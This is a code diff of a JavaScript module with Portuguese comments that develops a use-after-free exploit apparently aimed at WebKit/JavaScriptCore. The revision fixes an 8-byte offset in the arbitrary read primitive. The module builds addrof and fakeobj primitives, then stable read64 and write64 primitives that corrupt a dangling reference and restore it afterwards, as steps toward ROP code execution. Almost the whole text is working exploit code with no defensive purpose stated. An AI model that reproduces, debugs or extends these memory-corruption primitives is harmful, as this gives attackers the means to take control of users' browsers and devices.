@@ -1,22 +1,23 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R57 - Correção de Escopo)
+// js/script3/testArrayBufferVictimCrash.mjs (R58 - Correção de Offset de Leitura)
 // =======================================================================================
-// ESTRATÉGIA R57:
-// Corrigido o erro "fakeobj is not defined".
-// A primitiva `fakeobj` agora é passada corretamente como parâmetro para a função
-// `buildStatefulArbitraryReadWrite`, resolvendo o problema de escopo.
+// ESTRATÉGIA R58:
+// Corrigido o erro de offset de 8 bytes na primitiva de leitura.
+// A operação `.sub(8)` foi removida, pois a análise do log mostrou que a leitura
+// estava ocorrendo 8 bytes antes do endereço alvo. Esta deve ser a versão final da
+// primitiva de leitura/escrita estável.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "ROP_Execution_RealRW_R57";
+export const FNAME_MODULE = "ROP_Execution_RealRW_R58";
 
 const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
 const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };
 
 export async function runStableUAFPrimitives_R51() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: Correção de Escopo ---`, "test");
+    logS3(`--- Iniciando ${FNAME_MODULE}: Correção de Offset ---`, "test");
     
     let final_result = { success: false, message: "Falha na cadeia de exploit." };
 
@@ -39,7 +40,6 @@ export async function runStableUAFPrimitives_R51() {
         logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");
 
         logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (ESTÁVEL) ---", "subtest");
-        // CORRIGIDO: Passando 'fakeobj' como parâmetro.
         const { read64, write64 } = buildStatefulArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder);
         logS3("   Primitivas `read64` e `write64` REAIS e ESTÁVEIS construídas!", "good");
         
@@ -71,42 +71,34 @@ export async function runStableUAFPrimitives_R51() {
 
 
 // =======================================================================================
-// IMPLEMENTAÇÃO REAL E ESTÁVEL DE LEITURA/ESCRITA ARBITRÁRIA (R57)
+// IMPLEMENTAÇÃO REAL E ESTÁVEL DE LEITURA/ESCRITA ARBITRÁRIA (R58)
 // =======================================================================================
-// CORRIGIDO: Adicionado 'fakeobj' à lista de parâmetros.
 function buildStatefulArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder) {
-    // Estratégia de Gerenciamento de Estado:
-    // Preservar o estado do `dangling_ref.a` (apontando para `holder`) é a chave para a estabilidade.
-    
     // Salva o estado original (o ponteiro para o objeto `holder`).
     holder.original_a = dangling_ref.a;
 
     const read64 = (address) => {
-        // Corrompe `dangling_ref.a` para apontar para o endereço que queremos LER.
-        // `address.sub(8)` alinha o ponteiro para que a leitura do primeiro elemento do array
-        // corresponda exatamente ao conteúdo no `address`.
-        dangling_ref.a = fakeobj(address.sub(8));
+        // CORRIGIDO: Removida a operação `.sub(8)`. Agora apontamos diretamente para o endereço alvo.
+        dangling_ref.a = fakeobj(address);
 
-        // Lê o valor. `dangling_ref.b` agora lê diretamente da memória no `address`.
         const result = ftoi(dangling_ref.b);
         
-        // RESTAURA O ESTADO! Isso é crucial para a próxima chamada de `addrof` ou `fakeobj`.
+        // RESTAURA O ESTADO para garantir a estabilidade.
         dangling_ref.a = holder.original_a;
 
         return result;
     };
 
     const write64 = (address, value) => {
-        // Mesma lógica: corromper, operar, restaurar.
-        dangling_ref.a = fakeobj(address.sub(8));
+        // CORRIGIDO: Removida a operação `.sub(8)`.
+        dangling_ref.a = fakeobj(address);
         
         dangling_ref.b = itof(value);
         
         dangling_ref.a = holder.original_a;
     };
 
-    // Para a primeira chamada `fakeobj` dentro de `read64` funcionar, o estado de
-    // `dangling_ref.a` precisa ser o `holder`. Garantimos isso com uma chamada inicial a `addrof`.
+    // Garante que o estado inicial está correto antes de qualquer operação.
     addrof({dummy_setup: 1});
 
     return { read64, write64 };
